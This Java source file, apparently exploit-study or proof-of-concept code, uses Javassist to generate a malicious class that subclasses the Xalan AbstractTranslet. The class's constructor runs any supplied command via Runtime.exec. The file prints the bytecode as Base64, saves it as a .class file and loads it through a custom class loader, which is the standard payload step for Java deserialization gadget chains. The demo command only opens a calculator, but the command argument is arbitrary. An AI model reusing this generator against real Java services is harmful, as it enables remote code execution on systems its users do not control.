package com.faith.JavassistCode;
import javassist.*;

import java.io.File;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;

public class Exec1 {
    //利用javassist生成恶意的字节码
    public static byte[] GetEvailBytes(String Cmd) throws NotFoundException, CannotCompileException, IOException {
        ClassPool EvailPool = ClassPool.getDefault();
        CtClass EvalctClass = EvailPool.makeClass("EvalClass");
        CtClass AbstractTransletctClass = EvailPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        EvalctClass.setSuperclass(AbstractTransletctClass);
        CtConstructor EvalConstructor = CtNewConstructor.make("public EvalClass(){Runtime.getRuntime().exec(\"" + Cmd + "\");\n}", EvalctClass);
        EvalctClass.addConstructor(EvalConstructor);
        byte[] EvalclassBytecode = EvalctClass.toBytecode();
        EvalctClass.defrost();
        return EvalclassBytecode;

    }
    //自定义的类加载器
    class MyLoader extends ClassLoader {
        public MyLoader(ClassLoader parent) {
            super(parent);
        }
        public Class<?> EvalLoadClass(byte[] evalClassBytecode) throws NotFoundException, CannotCompileException {
            return super.defineClass(evalClassBytecode, 0, evalClassBytecode.length);

        }
    }
    //加载我们的字节码
    public void LoadEvalBytes(byte[] bytes) throws NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException {
        Exec1 exec1 = new Exec1();
        MyLoader myLoader = exec1.new MyLoader(Exec1.class.getClassLoader());
        Class<?> MyEvalClass = myLoader.EvalLoadClass(bytes);
        //一定记得加这个
        MyEvalClass.newInstance();
    }
    //输出为Base64
    public void PrintEvalBytes(byte[] bytes){
        String s = Base64.getEncoder().encodeToString(bytes);
        System.out.println(s);
    }
    //输出为恶意的类文件
    public void PrintEvalClass(byte[] bytes) throws IOException {
        FileOutputStream fos = new FileOutputStream(new File("src/main/java/com/faith/JavassistCode/Eval.class"));
        fos.write(bytes);
        fos.close();
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException {
        byte[] bytes = Exec1.GetEvailBytes("open -a calculator");
        new Exec1().PrintEvalBytes(bytes);
        new Exec1().PrintEvalClass(bytes);
        new Exec1().LoadEvalBytes(bytes);
    }
}


